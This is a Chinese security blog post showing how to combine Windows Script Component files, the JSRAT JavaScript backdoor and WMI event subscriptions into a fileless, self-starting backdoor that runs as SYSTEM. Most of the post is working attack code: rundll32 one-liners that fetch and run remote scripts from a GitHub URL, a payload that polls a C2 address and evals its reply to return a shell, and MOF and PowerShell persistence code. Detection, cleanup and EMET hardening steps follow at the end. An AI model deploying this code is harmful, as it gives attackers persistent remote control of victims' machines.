# WSC、JSRAT and WMI Backdoor

0x00 前言
=======

* * *

最近学习了lcx提供的资料《利用wsc来做一个asp后门》，在了解了wsc文件的一些特性后，产生了一个有趣的想法：

如果将其与JSRAT和WMI Backdoor相结合，那将会有多大的威力呢？

![Alt text](http://drops.javaweb.org/uploads/images/61da733f1a974b149af9638b2b313396ead423f9.jpg)

相关资料：

> 《利用wsc来做一个asp后门》:[http://huaidan.org/archives/2574.html](http://huaidan.org/archives/2574.html)  
> 《WMI Backdoor》:[http://drops.wooyun.org/tips/8260](http://drops.wooyun.org/tips/8260)  
> 《JavaScript Backdoor》:[http://drops.wooyun.org/tips/11764](http://drops.wooyun.org/tips/11764)

0x01 WSC
========

* * *

**WSC**，全称Windows Script  
可用来开发COM组件  
可被其他语言调用

更多介绍见：  
[http://www.xav.com/perl/Windows/windows_script_components.html](http://www.xav.com/perl/Windows/windows_script_components.html)

1、简单示例
------

一个简单的wsc脚本如下，保存为test.wsc：

```
<?xml version="1.0"?>
<package>
<component id="testWSC">    

<public>
 <method name="Sum">
        <PARAMETER name="X"/>
        <PARAMETER name="Y"/>
    </method>
</public>    

<script language="JScript">
<![CDATA[
function Sum(X, Y) {
    var result = X + Y;
    return result;
    }
]]>
</script>    

</component>
</package>

```

通过如下js代码即可调用脚本中的Sum函数：

```
var ref = GetObject("script:C:\\testwsc\\test.wsc");
var x = ref.Sum(4,6);
WScript.Echo(x);

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/8485f10780cbb9d0a89bfdbd774ecf4062fe1263.jpg)

**注：**  
wsc文件的后缀名可以任意

2、本地启动计算器
---------

以上内容和sct文件似曾相识，所以我们可以把里面的功能修改为启动一个计算器

wsc文件如下：

```
<?xml version="1.0"?>    

<package>
<component id="testCalc">    

<script language="JScript">
<![CDATA[
var r = new ActiveXObject("WScript.Shell").Run("calc.exe"); 
]]>
</script>    

</component>
</package>

```

对应的js文件可简化为：

```
GetObject("script:C:\\testwsc\\test.wsc");

```

执行后如图：

![Alt text](http://drops.javaweb.org/uploads/images/952a1949902271922eade850cb6e387cc115f4c5.jpg)

3、远程启动计算器
---------

**——**如果把wsc文件放到服务器上面呢？**——**当然可以正常执行。

地址如下：[https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test](https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test)

js文件修改为：

```
GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")

```

执行如图：

![Alt text](http://drops.javaweb.org/uploads/images/3c48f126537231b535398014b36d39b7c007905d.jpg)

0x02 JSRAT
==========

* * *

如果用在rundll32执行js的方法上会怎样呢？

1、calc
------

cmd下执行：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test")

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/a670815738ca436515af7291fac0460cd44bcfe0.jpg)

2、jsrat
-------

如果把服务器上文件的内容替换成jsrat的启动代码会怎样呢？  
代码如下:

```
<?xml version="1.0"?>    

<package>
<component id="testCalc">    

<script language="JScript">
<![CDATA[
        rat="rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication     


\";document.write();h=new%20ActiveXObject(\"WinHttp.WinHttpRequest.5.1\");w=new%20ActiveXObject(\"WScript.Shell\");try{v=w.RegRead(\"HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Internet%20Settings\\\\ProxyServer\");q=v.split(\"=\")[1].split(\";\")[0];h.SetProxy(2,q);}catch(e){}h.Open(\"GET\",\"http://127.0.0.1/connect\",false);try{h.Send();B=h.ResponseText;eval(B);}catch(e){new%20ActiveXObject(\"WScript.Shell\").Run(\"cmd /c taskkill /f /im rundll32.exe\",0,true);}";
        new ActiveXObject("WScript.Shell").Run(rat,0,true);
]]>
</script>    

</component>
</package>

```

为区别演示，已上传至另一文件testJSRAT：  
[https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/testJSRAT](https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/testJSRAT)

cmd下执行：

```
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/testJSRAT")

```

执行后弹回JSRAT的shell

3、分析
----

这种方式有如下优点：  
**a.**再次简化了JSRAT的启动代码，只需要执行GetObject()  
**b.**由于是远程执行wsc文件，所以payload随时可以更改，代码可以随时升级

0x03 WMI Backdoor
=================

* * *

通过WMI不仅可以定时执行程序，还能定时执行脚本  
定时执行程序的方法之前介绍过，此处跳过，下面介绍一下定时执行脚本的方法

WMI支持vbs和js脚本，这里只介绍启动js脚本的方法

1、mof
-----

注意转义字符  
"用\"表示  
内容如下：

```
pragma namespace("\\\\.\\root\\subscription")    

instance of __EventFilter as $EventFilter
{
    EventNamespace = "Root\\Cimv2";
    Name  = "filtP1";
    Query = "Select * From __InstanceModificationEvent "
            "Where TargetInstance Isa \"Win32_LocalTime\" "
            "And TargetInstance.Second = 1";
    QueryLanguage = "WQL";
};    

instance of ActiveScriptEventConsumer as $Consumer
{
    Name = "consP1";
    ScriptingEngine = "JScript";
    ScriptText = "GetObject(\"script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test\")";
};    

instance of __FilterToConsumerBinding
{
    Consumer   = $Consumer;
    Filter = $EventFilter;
};

```

演示略

2、powershell
------------

注意转义字符  
"用""表示  
内容如下：

```
$filterName = 'filtP1'
$consumerName = 'consP1'
$Command ="GetObject(""script:https://raw.githubusercontent.com/3gstudent/Javascript-Backdoor/master/test"")"    


$Query = "SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"    

$WMIEventFilter = Set-WmiInstance -Class __EventFilter -NameSpace "root\subscription" -Arguments @{Name=$filterName;EventNameSpace="root\cimv2";QueryLanguage="WQL";Query=$Query} -ErrorAction Stop    

$WMIEventConsumer = Set-WmiInstance -Class ActiveScriptEventConsumer -Namespace "root\subscription" -Arguments @{Name=$consumerName;ScriptingEngine='JScript';ScriptText=$Command}    

Set-WmiInstance -Class __FilterToConsumerBinding -Namespace "root\subscription" -Arguments @{Filter=$WMIEventFilter;Consumer=$WMIEventConsumer}

```

演示略

3、检测
----

```
Get-WMIObject -Namespace root\Subscription -Class __EventFilter    


Get-WMIObject -Namespace root\Subscription -Class __EventConsumer    


Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding

```

4、清除
----

```
Get-WMIObject -Namespace root\Subscription -Class __EventFilter -Filter "Name='filtP1'" | Remove-WmiObject -Verbose    

Get-WMIObject -Namespace root\Subscription -Class CommandLineEventConsumer -Filter "Name='consP1'" | Remove-WmiObject -Verbose    

Get-WMIObject -Namespace root\Subscription -Class __FilterToConsumerBinding -Filter "__Path LIKE '%BotFilter82%'" | Remove-WmiObject -Verbose

```

5、分析
----

**a.**注册后每隔1分钟执行一次远程服务器上的js脚本  
**b.**权限为system  
**c.**payload可以随时更换  
**d.**不写文件  
**e.**不写注册表  
**f.**自启动

0x04 防御
=======

* * *

1、第一道防线
-------

确保系统不被入侵。这个后门方法植入的前提是需要在系统上能够执行代码，所以建议勤打补丁、安装杀毒软件、防火墙

2、第二道防线
-------

建立白名单机制。启动Windows AppLocker，限制白名单以外的程序和脚本运行

3、第三道防线
-------

使用EMET（增强减灾体验工具）。配置规则可拦截并记录regsvr32和rundll32的使用 参考链接：  
[https://github.com/iadgov/Secure-Host-Baseline/tree/master/EMET#blocking-the-regsvr32-application-whitelisting-bypass-technique](https://github.com/iadgov/Secure-Host-Baseline/tree/master/EMET#blocking-the-regsvr32-application-whitelisting-bypass-technique)

4、配置EMET拦截regsvr32示例：
---------------------

**1、下载安装EMET 5.5**

[https://www.microsoft.com/en-us/download/details.aspx?id=50766](https://www.microsoft.com/en-us/download/details.aspx?id=50766)

**2、配置EMET组策略模板**

**(a)**在`%ProgramFiles%\EMET 5.5\Deployment\Group Policy Files\`或`%ProgramFiles(x86)%\EMET 5.5\Deployment\Group Policy Files\`（64位系统）下找到：  
EMET.admx  
EMET.adml

如图

![Alt text](http://drops.javaweb.org/uploads/images/1ac0b2ab96bc267cf719d26099ed9e87787b716b.jpg)

**(b)**将EMET.admx复制到`%SystemRoot%\PolicyDefinitions\`下

**(c)**将EMET.adml复制到`%SystemRoot%\PolicyDefinitions\zh-CN`下（英文版系统复制到`%SystemRoot%\PolicyDefinitions\en-us\`）

**3、配置EMET规则**

**(a)**输入gpedit.msc进入组策略 中文系统为：  
计算机配置-管理模板-Windows组件-EMET

英文系统为：  
`Computer Policy > Administrative Templates > Windows Components > EMET`

**(b)**双击Application Configuration  
选择启用  
点击显示

如图

![Alt text](http://drops.javaweb.org/uploads/images/d04c1387ef26f4e6fc68043e75edf6c112a95194.jpg)

**(c)**设置

值名称：`*\regsvr32.exe`  
值：`+ASR asr_modules:scrobj.dll;scrrun.dll`

如图

![Alt text](http://drops.javaweb.org/uploads/images/939228170ceb955d28e98b96c1b81d0737b81f0a.jpg)

**(d)**更新组策略模板

管理权权限的cmd下输入：

```
gpupdate /force

```

如图

![Alt text](http://drops.javaweb.org/uploads/images/d05f54d46b8c2843ea451460f9a1c0f9d844a8e2.jpg)

**(e)**测试

![Alt text](http://drops.javaweb.org/uploads/images/33caf7e646efd7fdd46eebb31b1b7880dd6ab723.jpg)

通过regsvr32调用scrobj.dll的操作被拦截

0x05 小结
=======

* * *

本文将WSC、JSRAT和WMI Backdoor三项技术融合，在脚本层面实现了一个近乎“完美”的后门。

当然，本文的初衷是在这项技术被滥用前尽可能的帮助大家提前做好防御的准备。